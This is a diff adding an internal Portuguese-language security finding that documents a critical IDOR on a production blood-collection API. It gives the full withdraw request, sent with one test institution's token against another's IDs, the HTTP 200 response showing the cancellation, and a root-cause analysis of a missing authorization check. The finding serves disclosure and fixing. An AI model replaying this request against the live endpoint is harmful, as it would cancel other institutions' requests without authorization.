@@ -1,0 +1,55 @@
+CRITICAL IDOR - evidencia de requisicao e resposta real (producao)
+Data/hora (UTC): 2026-08-28T00:14:58Z
+Rota: POST /api/v1/institutions/{institutionId}/collection-requests/{requestId}/withdraw
+
+Setup:
+- Fixture atacante: instituicao QA-TESTE Alpha (id 91b30035-61f4-462f-9f08-ebbb6331de77),
+  autenticada com o proprio JWT valido (Bearer), sem nenhum papel na instituicao alvo.
+- Fixture vitima: instituicao QA-TESTE Beta (id bb061558-6a72-44b1-96e4-e2293be96633),
+  dona da collection request 6a90d2eaf6421d8d9fbcd89f (status "pending" antes do ataque,
+  criada minutos antes por Beta via POST /api/v1/institutions/{betaId}/collection-requests).
+
+Requisicao (curl real, JWT de Alpha, institutionId e requestId de Beta na URL):
+
+POST https://coleta.hemocione.com.br/api/v1/institutions/bb061558-6a72-44b1-96e4-e2293be96633/collection-requests/6a90d2eaf6421d8d9fbcd89f/withdraw
+Authorization: Bearer <JWT de QA-TESTE Alpha, sub=6bba299d-2648-4046-98f4-e81e7e8fbd3a>
+Content-Type: application/json
+
+{"reason":"IDOR test route3 - painel institucional"}
+
+Resposta:
+
+HTTP/2 200
+content-type: application/json
+
+{
+  "success": true,
+  "data": {
+    "_id": "6a90d2eaf6421d8d9fbcd89f",
+    "status": "cancelled",
+    "bloodBankName": "HEMODEMO",
+    "institutionName": "QA-TESTE Beta",
+    "host": {"name": "QA Beta Contato", "email": "qa-teste-beta@hemocione-qa.test", "phone": "+5511999990002"},
+    "note": "QA round 2026-08-27 - Parte 3 IDOR withdraw (Beta)",
+    "requestedDates": [{"date": "2026-09-18"}],
+    "statusHistory": [
+      {"status": "pending", "changedAt": "2026-08-28T00:14:34.056Z", "reason": "Request created"},
+      {"status": "cancelled", "changedAt": "2026-08-28T00:14:58.452Z", "reason": "IDOR test route3 - painel institucional"}
+    ],
+    "createdAt": "2026-08-28T00:14:34.058Z"
+  },
+  "message": "Solicitacao retirada com sucesso"
+}
+
+Conclusao: a solicitacao pendente da instituicao Beta foi cancelada (withdraw) usando
+exclusivamente a autenticacao da instituicao Alpha. O corpo da resposta confirma que o
+"reason" enviado por Alpha foi gravado no statusHistory da propria solicitacao de Beta.
+Nenhum outro teste destrutivo foi tentado apos esta confirmacao, conforme instrucao de
+parar imediatamente diante de um achado critico confirmado em producao.
+
+Causa raiz (server/api/v1/institutions/[institutionId]/collection-requests/[requestId]/withdraw.post.ts):
+a rota confia no institutionId vindo da URL (controlado pelo chamador) e so confere
+`request.institutionId === institutionId` (URL) - nunca confere que o usuario autenticado
+(event.context.auth.user) tem de fato um institutionRole para esse institutionId. O helper
+`assertUserAccessToInstitutionId` existe em server/services/auth.ts e e usado em
+event-branding.put.ts, mas NAO e chamado aqui.
